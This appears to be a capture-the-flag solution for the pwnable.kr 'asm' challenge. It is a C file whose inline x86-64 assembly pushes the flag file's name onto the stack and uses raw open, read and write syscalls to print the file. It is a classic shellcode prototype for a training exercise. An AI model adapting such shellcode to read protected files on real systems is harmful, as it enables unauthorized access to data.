#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>

#define FNAME "this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong"
char buf[1024];
int main() {

	__asm__ volatile (

		"mov $0x00676e6f306f306f, %rax\r\n"
		"push %rax\r\n"
		"mov $0x306f306f306f306f, %rax\r\n"
		"push %rax\r\n"
		"mov $0x3030303030303030, %rax\r\n"
		"push %rax\r\n"
		"mov $0x303030306f6f6f6f, %rax\r\n"
		"push %rax\r\n"
		"mov $0x6f6f6f6f6f6f6f6f, %rax\r\n"
		"push %rax\r\n"
		"mov $0x6f6f6f6f6f6f6f6f, %rax\r\n"
		"push %rax\r\n"
		"mov $0x6f6f6f3030303030, %rax\r\n"
		"push %rax\r\n"
		"mov $0x3030303030303030, %rax\r\n"
		"push %rax\r\n"
		"mov $0x3030303030303030, %rax\r\n"
		"push %rax\r\n"
		"mov $0x303030306f6f6f6f, %rax\r\n"
		"push %rax\r\n"
		"mov $0x6f6f6f6f6f6f6f6f, %rax\r\n"
		"push %rax\r\n"
		"mov $0x6f6f6f6f6f6f6f6f, %rax\r\n"
		"push %rax\r\n"
		"mov $0x6f6f6f6f6f6f6f6f, %rax\r\n"
		"push %rax\r\n"
		"mov $0x6f6f6f6f6f6f6f6f, %rax\r\n"
		"push %rax\r\n"
		"mov $0x6f6f6f6f6f6f6f6f, %rax\r\n"
		"push %rax\r\n"
		"mov $0x6f6f6f6f6f6f6f6f, %rax\r\n"
		"push %rax\r\n"
		"mov $0x6f6f6f6f6f6f6f6f, %rax\r\n"
		"push %rax\r\n"
		"mov $0x6f6f6f6f6f6f6f6f, %rax\r\n"
		"push %rax\r\n"
		"mov $0x6f6f6f6f6f6f6f6f, %rax\r\n"
		"push %rax\r\n"
		"mov $0x6c5f797265765f73, %rax\r\n"
		"push %rax\r\n"
		"mov $0x695f656d616e5f65, %rax\r\n"
		"push %rax\r\n"
		"mov $0x6c69665f6568745f, %rax\r\n"
		"push %rax\r\n"
		"mov $0x7972726f732e656c, %rax\r\n"
		"push %rax\r\n"
		"mov $0x69665f736968745f, %rax\r\n"
		"push %rax\r\n"
		"mov $0x646165725f657361, %rax\r\n"
		"push %rax\r\n"
		"mov $0x656c705f656c6966, %rax\r\n"
		"push %rax\r\n"
		"mov $0x5f67616c665f726b, %rax\r\n"
		"push %rax\r\n"
		"mov $0x2e656c62616e7770, %rax\r\n"
		"push %rax\r\n"
		"mov $0x5f73695f73696874, %rax\r\n"
		"push %rax\r\n"

		"mov $0x2, %rax\r\n"
		"mov %rsp, %rdi\r\n"
		"mov $0x0, %rsi\r\n"
		"mov $0x0, %rdx\r\n"
		"syscall\r\n" //open


		"mov %rax, %rdi\r\n"
		"mov %rsp, %rsi\r\n"
		"mov $0x400, %rdx\r\n"
		"mov $0x0, %rax\r\n"
		"syscall\r\n" //read

		"mov $0x1, %rax\r\n"
		"mov $0x1, %rdi\r\n"
		"mov %rsp, %rsi\r\n"
		"syscall" //write
	);
	// read(fd, buf, 1000); 
	// write(1, buf, 1000);
}

//http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/